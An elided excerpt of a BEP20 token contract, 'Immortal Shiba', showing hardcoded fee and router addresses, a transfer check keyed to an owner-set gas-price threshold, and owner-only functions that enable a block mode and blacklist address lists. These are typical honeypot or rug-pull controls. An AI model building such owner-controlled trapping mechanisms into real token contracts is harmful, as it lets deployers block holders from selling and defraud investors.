...
contract ImmortalShiba is Ownable, IBEP20 {
    using SafeMath for uint256;

    address WBNB;
    address rewardtoken = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; //change in two places
    address gasrouter = 0x807bAf352cfD82e07bD94eFfb1Cf288896B8245E;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Immortal Shiba";
    string constant _symbol = "iShiba";
    ...
    constructor () {
       router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        ...
        marketingFeeReceiver = 0x45c35495C0C3EbA2CF27036361Bbc92b559F9849;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (tx.gasprice >= AS1 && recipient != pair) {
    ...
    function updateAS1 (uint256 _AS1) public onlyOwner {
               AS1 = _AS1 * 1 gwei; 
    
    }

    function enableblock(bool _status) public onlyOwner {
        blockMode = _status;
    }
    ...
    function manageBlock(address[] calldata addresses, bool status) public onlyOwner {
